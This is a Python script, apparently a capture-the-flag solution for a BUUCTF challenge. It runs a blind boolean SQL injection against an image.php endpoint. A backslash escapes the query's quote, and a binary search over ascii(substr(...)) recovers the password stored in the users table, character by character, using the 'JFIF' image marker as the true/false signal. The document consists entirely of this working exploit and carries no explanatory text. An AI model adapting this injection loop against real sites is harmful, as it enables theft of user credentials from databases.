import  requests
url = "http://5eb44461-67e7-42ed-ad52-9c3bba79884a.node3.buuoj.cn/image.php?id=\\0&path="
payload = "or id=if(ascii(substr((select password from users),{0},1))>{1},1,0)%23"
result = ""
for i in range(1,100):
    l = 1
    r = 130
    mid = (l + r)>>1
    while(l<r):
        payloads = payload.format(i,mid)
        print(url+payloads)
        html = requests.get(url+payloads)
        if "JFIF" in html.text:
            l = mid +1
        else:
            r = mid
        mid = (l + r)>>1
    result+=chr(mid)
    print(result)

